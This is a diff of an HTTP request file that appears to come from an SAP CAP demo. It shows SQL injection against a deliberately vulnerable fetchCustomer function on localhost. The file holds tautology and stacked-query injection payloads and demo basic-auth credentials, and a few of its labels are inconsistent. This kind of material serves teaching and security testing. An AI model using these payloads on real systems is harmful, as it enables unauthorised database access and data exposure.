@@ -1,40 +1,46 @@
 @server=http://localhost:4004
-  @username=incident.support@tester.sap.com // admin role
-  @password=initial
-  
-  ### Step 1: Legitimate Customer Lookup
-  ### Action: Normal request with valid customer ID
-  ### Expected: Returns single customer record
-  ### Result: System returns data for customer ID 1004100
-  GET {{server}}/odata/v4/admin/fetchCustomer
-  Content-Type: application/json
-  Authorization: Basic {{username}}:{{password}}
-  
-  {
-    "customerID": "1004100"
-  }
-  
-  ### Step 2: SQL Injection True-Clause Attack
-  ### Action: Inject malicious payload ' OR '1'='1
-  ### Expected: Returns ALL customer records
-  ### Result: Full database exposure vulnerability
-  GET {{server}}/odata/v4/admin/fetchCustomer
-  Content-Type: application/json
-  Authorization: Basic {{username}}:{{password}}
-  
-  {
-    "customerID": "1004100' OR '1'='1"
-  }
+@username=incident.support@tester.sap.com
+@password=initial
 
- ### Step 3: Test other common SQL injection payloads to ensure robustness
- ### Action: Inject malicious payload 'UNION SELECT * FROM Customers --" }
- ### Expected: Returns ALL customer records
- ### Result: Full database exposure vulnerability
+### 🔒 SQL INJECTION VULNERABILITY DEMO
+# =====================================================
+# VULNERABLE: Custom fetchCustomer OData Function
+# This demonstrates SQL injection in CAP services
+# The function uses direct string interpolation in services.js
+# =====================================================
 
-  GET http://localhost:4004/odata/v4/admin/fetchCustomer
-  Content-Type: application/json
-  Authorization: Basic incident.support@tester.sap.com:initial
+### @name fetchCustomer_Legitimate
+### ✅ Test 1: Legitimate customer lookup
+### Expected: Returns 1 customer (Daniel Watts)
+GET  {{server}}/odata/v4/admin/fetchCustomer
+Content-Type: application/json
+Authorization: Basic {{username}}:{{password}}
 
 {
-  "customerID": "1004100'; SELECT * from sap_capire_incidents_Customers;-- "
+  "customerID": "1004100"
+}
+
+### @name fetchCustomer_SQLInjection_Tautology
+### 🚨 Test 3: SQL Injection - Tautology Attack
+### Payload: ' OR '1'='1  (Always true condition)
+### Expected: Returns ALL customers (VULNERABILITY!)
+GET  {{server}}/odata/v4/admin/fetchCustomer
+Content-Type: application/json
+Authorization: Basic {{username}}:{{password}}
+
+{
+     "customerID": "1004100' OR '1'='1"
+}
+
+
+### @name fetchCustomer_SQLInjection_ multiple sql statements
+### 🚨 Test 3: SQL Injection -  multiple sql statements
+### Payload: 'UNION SELECT * FROM Customers --"   (multiple sql statements)
+### Expected: Returns empty array
+GET  {{server}}/odata/v4/admin/fetchCustomer
+Content-Type: application/json
+Authorization: Basic {{username}}:{{password}}
+
+{
+     "customerID": "1004100'; SELECT * from sap_capire_incidents_Customers;-- "
 }
